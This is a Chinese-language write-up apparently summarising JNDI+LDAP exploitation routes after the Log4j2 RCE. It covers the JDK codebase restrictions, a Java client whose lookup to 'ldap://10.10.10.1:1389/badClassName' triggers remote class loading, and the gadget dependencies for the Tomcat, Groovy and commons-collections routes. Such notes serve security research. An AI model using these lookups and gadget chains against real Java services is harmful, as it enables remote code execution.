### 缘起Log4j2 

因为 Log4j2 RCE(CVE-2021-44228)的出现，所以顺便把JNDI+LDAP的利用姿势一并总结。
利用需要注意的限制

- java.rmi.server.useCodebaseOnly
  - 默认值为true，禁止自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。
- com.sun.jndi.rmi.object.trustURLCodebase
  - 默认为false，禁止RMI和CORBA协议使用远程codebase的选项
- com.sun.jndi.ldap.object.trustURLCodebase
  - 默认为false，禁止LDAP协议使用远程codebase的选项


### JNDI via LDAP

#### 0x01 理想环境(trustURLCodebase == true) 

LDAP客户端：LDAPClient.java
```java
package ldap;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class LDAPClient {
    public static void main(String[] args) throws NamingException {
        /**
         * 注意：JDK 11.0.1、8u191、7u201、6u211 com.sun.jndi.ldap.object.trustURLCodebase 默认为false
         * 所以：在进行JNDI利用时，需要注意目标使用的JDK版本
         */
        Context ctx = new InitialContext();
        ctx.lookup("ldap://10.10.10.1:1389/badClassName");
    }
}
```

LDAP服务端：[LDAPKit](https://github.com/EmYiQing/LDAPKit) （改了一下，加了一些链进去）

![image](jndi.assets/145824043-3627762c-f77a-46e5-89e1-db3d60974bf8.png)

测试效果：

![image](jndi.assets/145824238-f1604171-0d61-4c23-bcd9-0de3391272a6.png)

#### 0x02 Tomcat v8+

Tomcat v8+
- org.apache.naming.factory.BeanFactory
- javax.el.ELProcessor

依赖环境
```xml
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-core</artifactId>
    <version>8.5.61</version>
</dependency>
````


#### 0x03 Groovy （

依赖环境
```xml
<dependency>
    <groupId>org.codehaus.groovy</groupId>
    <artifactId>groovy-all</artifactId>
    <version>1.5.0</version>
</dependency>
```


#### 0x04 javaSerializedData属性+Gadgets(如CC链)

依赖环境
```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
```

起一个LDAP + CC05的服务端：
![image](jndi.assets/145829752-3b2cdc81-06ef-4cb2-8d57-258af89604fc.png)

测试效果：

![image](jndi.assets/145829956-4d622421-53d3-40d8-a659-fa3328f76623.png)





